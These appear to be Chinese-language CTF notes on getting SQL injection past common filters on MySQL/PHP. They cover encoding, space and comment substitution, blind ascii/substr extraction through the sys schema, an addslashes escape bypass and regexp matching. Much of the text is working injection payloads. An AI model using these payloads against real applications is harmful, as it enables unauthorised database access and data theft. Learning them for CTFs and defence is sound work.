## **编码绕过**
is_numeric($_GET[‘id’]) ，过滤只允许数字，16进制编码sql注入。

^
## **空格被过滤**
空格过滤可以利用/**/代替空格。
利用括号，括号住变量。
```
所有库
select(group_concat(schema_name))from(information_schema.schemata)
库所有表
select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())
```

^
## **注释符被过滤**
将后面的单引号闭合即可。

^
## **or 被过滤导致orderby、information_schema都不能用**
用其他逻辑运算符and ， && ， &， |  ,1^1^
查表名使用 
```
select group_concat(table_name）from mysql.innodb_table_stats where database_name=database()
```
如果information_schema被禁止，通过sys.schema获取当前数据库表名
```
1&&ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),1,1))=103
2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database()),{},1))={}.format()
```
通过无列名注入获取表字段，group_concat(某一字段所有值)。
<https://www.cnblogs.com/hello-there/p/12918265.html>

^
## **函数等效替换**
报错函数被过滤，寻找顶替。



^
## **存在转义函数**
```
addslashes($id);
将字符串里面的' " \等转义。
'将变成\'


如果此时下面存在，特殊字符去除 \0 %00 \' '
$id=str_replace(array("\\0","%00","\\'","'"),"",$id);

那么传入\0 先变成\\0 再变成\
如果是sql语句\就会转义后面字符。
select * from images where id='{$id}' or path='{$path}'

select * from images where id='\' or path='   {$path}'
这里'\' or path = ' 成了一个单独字符串
$path就可以随意注入
or sleep(3)--+
```


^
## **where后=被过滤，用字段名使用正则模糊匹配字段的值**
需要知道字段名
```
select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp('^f')

select flag from Flag where flag regexp "^f";
```